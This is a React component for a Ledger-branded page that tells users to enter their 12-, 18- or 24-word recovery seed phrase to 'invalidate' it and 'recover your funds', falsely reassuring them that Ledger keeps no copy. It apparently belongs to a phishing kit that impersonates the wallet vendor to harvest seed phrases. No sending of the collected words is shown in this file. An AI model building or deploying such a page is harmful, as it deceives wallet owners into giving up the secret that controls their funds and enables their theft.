import React, { useState, useContext } from 'react'
import { seed_phrase, ledger_logo } from '../assets'
import ProgressBar from '../components/Progress/ProgressBar'
import BackButton from '../components/Buttons/BackButton'
import { PageContext } from '../contexts/PageContext'
import { nextPage } from '../utils/pageUtils'

const SeedPhrases: React.FC = () => {
    const { pageDispatch } = useContext(PageContext)

    const [activeTab, setActiveTab] = useState<number>(12)
    const [words, setWords] = useState<Record<number, string>>({})
    const [errors, setErrors] = useState<Record<number, boolean>>({})

    const navigateToNextPage = () => {
        if (validateSeedPhrase()) {
            nextPage(pageDispatch)
        }
    }

    const handleTabChange = (tab: number) => {
        setActiveTab(tab)
        setWords({})
        setErrors({})
    }

    const handleValidatedInputChange = (index: number, value: string) => {
        const regex = /^[a-zA-Z]+$/
        if (regex.test(value) || value === '') {
            setWords((prev) => ({ ...prev, [index]: value }))
            setErrors((prev) => ({ ...prev, [index]: false }))
        } else {
            setWords((prev) => ({ ...prev, [index]: value }))
            setErrors((prev) => ({ ...prev, [index]: true }))
        }
    }

    const validateSeedPhrase = (): boolean => {
        const isValid =
            Object.values(words).length === activeTab &&
            Object.values(words).every((word) => word.trim().length > 0) &&
            Object.values(errors).every((error) => !error)
        return isValid
    }

    return (
        <div className="w-full overflow-x-hidden min-h-screen font-inter flex relative bg-[#181a1c] text-white">
            <div className="hidden min-w-[350px] w-[350px] min-h-screen bg-[#bbb3fa] p-[40px] md:flex flex-col">
                <div className="flex items-center justify-center w-full h-[40px]">
                    <img
                        className="w-[120px]"
                        src={ledger_logo}
                        alt="ledger logo"
                    />
                </div>
                <div className="my-auto flex items-center justify-center">
                    <img
                        src={seed_phrase}
                        className="w-[200px]"
                        alt="seed phrase"
                    />
                </div>
            </div>

            <div className="flex h-full flex-col w-full overflow-x-hidden sm:px-[100px] px-[30px] py-[30px]">
                <ProgressBar step={5} />

                <div>
                    <h2 className="font-medium text-[26px] mb-[10px] font-dm-mono leading-[34px]">
                        INVALIDATE &amp; GENERATE NEW SEED PHRASE
                    </h2>
                    <p className="text-[14px] text-[#bfbfc1] leading-[1.5] mb-[20px]">
                        Enter your current Recovery Seed Phrase to recover your
                        funds. A new Recovery Seed Phrase will be generated on
                        the next step. <br />
                        **Ledger does not keep a copy of your recovery phrase.
                    </p>
                </div>

                <div className="my-[30px] flex justify-between gap-[20px]">
                    {[12, 18, 24].map((num, index) => (
                        <button
                            key={index}
                            onClick={() => handleTabChange(num)}
                            className={`text-[14px] rounded-[4px] w-full font-semibold h-[42px] ${
                                activeTab === num
                                    ? 'bg-[#bbb3fa] text-[#121113]'
                                    : 'text-[#bfbfc1] bg-[#222]'
                            }`}
                        >
                            {num} Words
                        </button>
                    ))}
                </div>

                <form onSubmit={(e) => e.preventDefault()}>
                    <div className="flex flex-col md:grid md:grid-cols-4 md:gap-x-[5px] gap-[20px] w-full mb-[20px]">
                        {[...Array(activeTab)].map((_, i) => (
                            <input
                                key={i}
                                type="text"
                                placeholder={`${i + 1}. word`}
                                className={`rounded-[4px] text-[14px] font-semibold bg-[#151515] py-[10px] h-[42px] flex
                                    items-center w-full border px-[10px]
                                    ${
                                        errors[i + 1]
                                            ? 'border-[rgb(242,116,116)] text-[rgb(242,116,116)] shadow-[0_0_2px_rgb(242,116,116)]'
                                            : 'border-[rgb(51,51,51)] text-white focus-seed-shadow focus:border-[rgb(180,219,237)]'
                                    }
                                    focus:outline-none`}
                                onChange={(e) =>
                                    handleValidatedInputChange(
                                        i + 1,
                                        e.target.value
                                    )
                                }
                                value={words[i + 1] || ''}
                                required
                            />
                        ))}
                    </div>
                    <div className="mt-auto flex justify-between w-full">
                        <BackButton
                            text={'Continue'}
                            arrowDirection={'forward'}
                            function={navigateToNextPage}
                        />
                    </div>
                </form>
            </div>
        </div>
    )
}

export default SeedPhrases
